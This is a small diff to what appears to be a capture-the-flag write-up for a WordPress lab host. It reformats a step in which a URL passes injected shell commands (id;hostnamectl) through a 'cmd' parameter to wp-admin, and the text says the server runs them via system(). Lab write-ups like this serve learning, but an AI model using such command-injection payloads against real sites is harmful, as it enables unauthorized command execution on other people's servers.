@@ -199,8 +199,9 @@ Since we have credentials we can see if the `wpuser` have admin access by:
     
 2. Visit:
 
-    ```
-```hhttp://www.smol.thm/wp-admin/?cmd=id;hostnamectl
+
+```
+http://www.smol.thm/wp-admin/?cmd=id;hostnamectl
 ```
     
 3. The system will execute `system("id")`, revealing user info.
